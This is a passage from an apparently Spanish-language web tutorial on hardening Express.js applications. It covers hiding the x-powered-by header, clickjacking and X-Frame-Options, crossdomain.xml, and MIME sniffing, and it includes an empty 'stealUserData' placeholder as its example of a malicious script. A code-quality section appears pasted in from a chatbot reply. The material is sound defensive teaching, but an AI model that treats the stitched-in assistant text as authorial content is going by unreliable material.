+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">disable</span><span class="p">(</span><span class="s2">&quot;x-powered-by&quot;</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Desactivar la opción <code>x-powered-by</code> deshabilita el envío del header. Esto hará que sea un poco más difícil para los hackers. No te hará invencible —hay muchos otros caminos para el ataque— pero puede ayudar un poco, ¡y cada poquito ayuda!</p>
+<h3 id="previniendo-clickjacking">Previniendo clickjacking<a class="headerlink" href="#previniendo-clickjacking" title="Permanent link">&para;</a></h3>
+<p>Creo que el <strong>clickjacking</strong> es bastante ingenioso. Es relativamente fácil de prevenir, pero casi me siento culpable por hacerlo. Es un truco tan ingenioso.</p>
+<p>Imagina que soy un hacker y quiero obtener información de tu perfil privado de redes sociales. Me encantaría que simplemente hicieras público tu perfil. Sería tan fácil si pudiera hacerte clic en el gran botón mostrado en la figura 10.4.</p>
+<p><img alt="" src="../profile.png" /></p>
+<p>El <strong>clickjacking</strong> aprovecha los frames del navegador —la capacidad de incrustar una página dentro de otra— para hacer que esto suceda. Podría enviarte un enlace a una página de aspecto inocente, que podría verse algo como la figura 10.5.</p>
+<p><img alt="" src="../pagelarge.png" title="Una página de apariencia inofensiva que oculta un ataque de clickjacking." /></p>
+<p><img alt="" src="../otherpageatack.png" title="Ya no es tan inocente, ¿verdad?" /></p>
+<p>Pero en realidad, esta página de aspecto inocente está <strong>ocultando la página de la red social</strong>! Hay una página de la red social, y es <strong>invisible</strong>. Está posicionada justo bien, para que cuando hagas clic en "Click aquí para entrar a mi página", en realidad estés haciendo clic en <strong>"Click para hacer el perfil público"</strong>, como revela la figura 10.6.</p>
+<p>No sé tú, pero yo pienso que eso es bastante ingenioso. Desafortunadamente para los hackers, es <strong>bastante fácil de prevenir</strong>.</p>
+<p>La mayoría de los navegadores (y todos los modernos) escuchan un header llamado <strong>X-Frame-Options</strong>. Si está cargando un frame o iframe y esa página envía un X-Frame-Options restrictivo, el navegador ya no cargará el frame.</p>
+<p><strong>X-Frame-Options tiene tres opciones</strong>:</p>
+<ul>
+<li><strong>DENY</strong>: impide que cualquiera ponga tu sitio en un frame, punto.</li>
+<li><strong>SAMEORIGIN</strong>: impide que otros pongan tu sitio en un frame, pero tu propio sitio está permitido.</li>
+<li><strong>ALLOW-FROM</strong>: permite que un sitio específico lo haga.</li>
+</ul>
+<p><strong>Recomiendo SAMEORIGIN o DENY</strong>.</p>
+<p>Si estás usando <strong>Helmet</strong>, puedes configurarlos fácilmente:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span>
+<span class="normal"><a href="#__codelineno-29-3">3</a></span>
+<span class="normal"><a href="#__codelineno-29-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">helmet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;helmet&#39;</span><span class="p">);</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">.</span><span class="nx">frameguard</span><span class="p">({</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a><span class="w">  </span><span class="nx">action</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;SAMEORIGIN&#39;</span><span class="w"> </span><span class="c1">// o &#39;DENY&#39;</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a><span class="p">}));</span>
+</span></code></pre></div></td></tr></table></div>
+<p>O simplemente:
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">());</span><span class="w"> </span><span class="c1">// Configuración por defecto segura</span>
+</span></code></pre></div></td></tr></table></div></p>
+<p>Este middleware de Helmet establecerá <strong>X-Frame-Options</strong> para que no tengas que preocuparte por que tus páginas sean susceptibles a ataques de clickjacking.</p>
+<h3 id="manteniendo-los-productos-adobe-fuera-de-tu-sitio">Manteniendo los productos Adobe fuera de tu sitio<a class="headerlink" href="#manteniendo-los-productos-adobe-fuera-de-tu-sitio" title="Permanent link">&para;</a></h3>
+<p>Los productos de Adobe como <strong>Flash Player</strong> y <strong>Reader</strong> pueden hacer solicitudes web cross-origin. Como resultado, un archivo Flash podría hacer solicitudes a tu servidor. Si otro sitio web sirve un archivo Flash malicioso, los usuarios de ese sitio podrían hacer solicitudes arbitrarias a tu aplicación Express (probablemente sin saberlo). </p>
+<p>Esto podría causar que martillen tu servidor con solicitudes o que carguen recursos que no pretendes que carguen.</p>
+<p>Esto se previene fácilmente agregando un archivo en la <strong>raíz de tu sitio</strong> llamado <strong><code>crossdomain.xml</code></strong>.</p>
+<p>Cuando un producto de Adobe va a cargar un archivo de tu dominio, primero verificará el archivo <code>crossdomain.xml</code> para asegurarse de que tu dominio lo permite. Como administrador, puedes definir este archivo XML para permitir o denegar ciertos usuarios Flash en tu sitio.</p>
+<p>Es probable que <strong>no quieras ningún usuario Flash</strong> en tu página. En ese caso, asegúrate de servir este contenido XML en la raíz de tu sitio (en <code>/crossdomain.xml</code>), como muestra el siguiente listado:</p>
+<div class="language-xml highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span>
+<span class="normal"><a href="#__codelineno-31-2">2</a></span>
+<span class="normal"><a href="#__codelineno-31-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2"></a><span class="cp">&lt;!DOCTYPE cross-domain-policy SYSTEM &quot;http://www.adobe.com/xml/dtds/cross-domain-policy.dtd&quot;&gt;</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3"></a><span class="nt">&lt;cross-domain-policy/&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Esto <strong>impide que cualquier usuario Flash cargue contenido de tu sitio</strong>, a menos que vengan de tu propio dominio.</p>
+<p>Si estás interesado en cambiar esta política, mira la especificación en <a href="https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html">https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html</a>.</p>
+<p>Puedes colocar el archivo <code>crossdomain.xml</code> restrictivo en un directorio para tus archivos estáticos para que se sirva cuando se solicite.</p>
+<h3 id="no-permitas-que-los-navegadores-infieran-el-tipo-de-archivo">No permitas que los navegadores infieran el tipo de archivo<a class="headerlink" href="#no-permitas-que-los-navegadores-infieran-el-tipo-de-archivo" title="Permanent link">&para;</a></h3>
+<p>Imagina que un usuario ha subido un archivo de texto plano a tu servidor llamado <code>file.txt</code>. Tu servidor lo sirve con un content type de <code>text/plain</code>, porque es texto plano. Hasta aquí, todo simple.</p>
+<p>Pero ¿qué pasa si <code>file.txt</code> contiene algo como el script del siguiente listado?</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span>
+<span class="normal"><a href="#__codelineno-32-2">2</a></span>
+<span class="normal"><a href="#__codelineno-32-3">3</a></span>
+<span class="normal"><a href="#__codelineno-32-4">4</a></span>
+<span class="normal"><a href="#__codelineno-32-5">5</a></span>
+<span class="normal"><a href="#__codelineno-32-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a><span class="c1">// Un script malicioso que podría almacenarse como texto plano.</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2"></a>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3"></a><span class="kd">function</span><span class="w"> </span><span class="nx">stealUserData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4"></a><span class="w">  </span><span class="c1">// algo malvado aquí...</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5"></a><span class="p">}</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6"></a><span class="nx">stealUserData</span><span class="p">();</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Aunque estés sirviendo este archivo como <strong>texto plano</strong>, esto <strong>parece JavaScript</strong>, y algunos navegadores intentarán <strong>"sniffear" el tipo de archivo</strong>. ¡Esto significa que algunos navegadores ejecutarán <code>file.txt</code> aunque el content type no sea JavaScript!</p>
+<p>Este ejemplo se extiende aún más si <code>file.txt</code> parece HTML y el navegador lo interpreta como HTML. Esa página HTML puede contener <strong>JavaScript malicioso</strong> que podría hacer muchas cosas malas.</p>
+<p>Afortunadamente, puedes solucionarlo con <strong>un solo header HTTP</strong>. Puedes establecer el header <strong>X-Content-Type-Options</strong> a su única opción: <code>nosniff</code>.</p>
+<p><strong>Helmet viene con el middleware <code>noSniff</code></strong>, y puedes usarlo así:</p>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">helmet</span><span class="p">.</span><span class="nx">noSniff</span><span class="p">());</span>
+</span></code></pre></div></td></tr></table></div>
+<p>¡Qué bueno que un header HTTP pueda arreglar esto!</p>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Pensar como hacker</strong> te ayudará a detectar agujeros de seguridad.</li>
+<li>Usar un verificador de sintaxis como <strong>JSHint</strong> puede ayudarte a detectar bugs en tu código.</li>
+<li><strong>Parsear query strings en Express</strong> tiene algunas trampas. Asegúrate de saber qué tipos de variables pueden ser tus parámetros.</li>
+<li><strong>HTTPS</strong> debe usarse en lugar de HTTP.</li>
+<li><strong>Cross-site scripting (XSS), cross-site request forgery (CSRF) y ataques man-in-the-middle</strong> pueden mitigarse. <strong>Nunca confiar en la entrada del usuario</strong> y verificar las cosas en cada paso puede ayudarte a protegerte.</li>
+<li><strong>Los servidores que fallan es inevitable</strong>. <strong>Forever</strong> es una herramienta que puedes usar para asegurarte de que tu aplicación se reinicie después de un fallo.</li>
+<li><strong>Auditar tu código de terceros</strong> usando el <strong>Node Security Project</strong> (¡y sentido común!).</li>
+</ul>
+<h2 id="otro-tema-herramientas-de-calidad-de-codigo-por-tipo-de-archivo-en-proyectos-web">Otro tema - Herramientas de calidad de código por tipo de archivo en proyectos web<a class="headerlink" href="#otro-tema-herramientas-de-calidad-de-codigo-por-tipo-de-archivo-en-proyectos-web" title="Permanent link">&para;</a></h2>
+<p>Perfecto, te lo integro y lo convierto en una <strong>tabla más “de ingeniería seria”, no solo lista bonita</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Tecnología</th>
+<th>Herramienta</th>
+<th>Rol en el sistema</th>
+<th>¿Por qué se usa?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JavaScript (Node / Frontend)</td>
+<td>ESLint</td>
+<td>Analizador de código y reglas</td>
+<td>Detecta errores, malas prácticas y asegura consistencia en la lógica</td>
+</tr>
+<tr>
+<td>CSS</td>
+<td>Stylelint</td>
+<td>Validador de estilos</td>
+<td>Mantiene orden visual, consistencia y evita conflictos de estilos</td>
+</tr>
+<tr>
+<td>HTML</td>
+<td>HTMLHint / Prettier</td>
+<td>Validador y formateador</td>
+<td>Evita errores de estructura y mejora legibilidad del markup</td>
+</tr>
+<tr>
+<td>EJS (templates Express)</td>
+<td>Sin estándar fijo / Prettier parcial</td>
+<td>Motor de templates</td>
+<td>Se usa para mezclar HTML + JS en servidor, generalmente se formatea más que se “linteriza”</td>
+</tr>
+<tr>
+<td>Código general</td>
+<td>Prettier</td>
+<td>Formateador automático</td>
+<td>Unifica estilo (indentación, comillas, saltos de línea) sin discutir reglas</td>
+</tr>
+</tbody>
+</table>
+<h3 id="resumen-ejecutivo-integrado">Resumen ejecutivo (integrado)<a class="headerlink" href="#resumen-ejecutivo-integrado" title="Permanent link">&para;</a></h3>
+<ul>
+<li>✔ <strong>Título ideal:</strong> <em>“Herramientas de calidad de código por tipo de archivo en proyectos web”</em></li>
+<li>✔ <strong>Clave del sistema:</strong> separación por capas (lógica, estilo, estructura)</li>
+<li>✔ <strong>Idea central:</strong> cada tecnología tiene su propia herramienta de control</li>
+<li>✔ <strong>Valor agregado:</strong> entender el “por qué” detrás de cada herramienta evita confusión y malas configuraciones</li>
+<li>✔ <strong>Principio de ingeniería:</strong> consistencia antes que preferencia personal</li>
+</ul>
+<hr />
+<h4 id="lectura-profesional-del-sistema">Lectura profesional del sistema<a class="headerlink" href="#lectura-profesional-del-sistema" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>No estás usando herramientas sueltas. Estás construyendo un <strong>ecosistema de calidad automatizada</strong>.</p>
+</blockquote>
+<ul>
+<li>ESLint = lógica</li>
+<li>Stylelint = diseño</li>
+<li>HTMLHint = estructura</li>
+<li>Prettier = armonía visual</li>
+<li>EJS = puente servidor–vista</li>
+</ul>
+<hr />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../cap2/TestingExpressApplication/" class="md-footer__link md-footer__link--prev" aria-label="Previous: TESTING EXPRESS APPLICATION">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                TESTING EXPRESS APPLICATION
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../cap4/Deplyment/" class="md-footer__link md-footer__link--next" aria-label="Next: DEPLOYMENT">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                DEPLOYMENT
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 The authors
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
